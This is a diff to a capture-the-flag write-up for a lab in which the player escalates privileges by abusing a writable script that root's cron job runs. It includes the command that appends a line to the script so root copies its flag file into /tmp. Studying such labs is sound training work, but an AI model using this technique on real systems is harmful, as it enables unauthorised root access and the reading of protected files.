@@ -1,6 +1,8 @@
 
 - Room Information
 	- A backup server hums quietly, running its automated maintenance tasks on schedule. But are those scheduled tasks really secure? SSH in, enumerate the system like a real pentester, and discover how a simple misconfiguration can lead to complete system compromise. Time is ticking, the cron job runs every minute!
+
+- Lab URL - https://hackerdna.com/labs/scheduled-sabotage
 	
 
 - 1) Nmap Enumeration
@@ -22,7 +24,7 @@
 			- Backup manager installed in /opt/
 - 4) User Flag
 	- Browse to /opt/ folder as mentioned above
-		- Located file while browsing scripts folder
+		- Located user flag while browsing through available folders in the directory
 	
 - 5) Next Steps
 	- Check Cron Jobs
@@ -46,28 +48,11 @@ echo "[$(date)] System check finished."
 ip-10-0-10-176:/etc$
 ```
 
-- 7) Contents of disk_status.txt - Not sure if this is needed
-``` Results
-Filesystem                Size      Used Available Use% Mounted on
-overlay                  20.5G      2.6G     16.8G  13% /
-tmpfs                    64.0M         0     64.0M   0% /dev
-shm                     920.1M         0    920.1M   0% /dev/shm
-tmpfs                   920.1M         0    920.1M   0% /sys/fs/cgroup
-/dev/nvme1n1             20.5G      2.6G     16.8G  13% /etc/hosts
-/dev/nvme1n1             20.5G      2.6G     16.8G  13% /etc/resolv.conf
-/dev/nvme1n1             20.5G      2.6G     16.8G  13% /etc/hostname
-tmpfs                   920.1M         0    920.1M   0% /proc/acpi
-tmpfs                    64.0M         0     64.0M   0% /proc/kcore
-tmpfs                    64.0M         0     64.0M   0% /proc/keys
-tmpfs                    64.0M         0     64.0M   0% /proc/latency_stats
-tmpfs                    64.0M         0     64.0M   0% /proc/timer_list
-tmpfs                   920.1M         0    920.1M   0% /sys/firmware
-tmpfs                   920.1M         0    920.1M   0% /proc/scsi
-```
-
-- 8) Modify cron job script
+- 7) Modify cron job script
 	- `echo "cp /root/flag-root.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt" >> /opt/backup-manager/scripts/system_check.sh`
 		- `cp /root/flag-root.txt` - what file to copy
 		- `/tmp/flag.txt` - where to copy file to
 		- `chmod 644 /tmp/flag.txt` - sets file permissions to make it readable
 		- `>> /opt/backup-manager/scripts/system_check.sh` - what script is being appended 
+-
+8) Wait for job to run and look for flag in /tmp/flag.txt
